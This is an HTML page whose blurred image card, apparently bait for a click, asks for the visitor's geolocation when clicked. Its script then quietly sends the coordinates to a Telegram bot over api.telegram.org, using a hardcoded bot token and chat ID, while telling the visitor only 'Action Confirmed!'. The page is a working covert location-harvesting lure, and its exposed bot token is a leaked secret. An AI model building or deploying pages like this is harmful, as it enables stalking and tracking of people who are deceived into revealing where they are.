<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Action Card</title>
  <style>
    body {
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f0f0f0;
    }
    #card {
      width: 300px;
      height: 200px;
      background-image: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg');
      background-size: cover;
      background-position: center;
      filter: blur(3px); /* الصورة مموهة */
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-weight: bold;
      text-shadow: 1px 1px 2px black;
      font-size: 18px;
      user-select: none;
    }
    #card:hover {
      filter: blur(1px); /* كشف بسيط عند التمرير */
    }
  </style>
</head>
<body>
  <div id="card"></div>

  <script>
    const card = document.getElementById('card');
    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; // توكن البوت
    const CHAT_ID = "7485197107"; // معرف الشات

    card.addEventListener('click', () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `Lat: ${lat}\nLon: ${lon}`
              })
            })
            .then(res => console.log('Sent to bot', res))
            .catch(err => console.error(err));

            alert('Action Confirmed!');
          },
          error => alert('Unable to get location: ' + error.message)
        );
      } else {
        alert('Geolocation not supported.');
      }
    });
  </script>
</body>
</html>
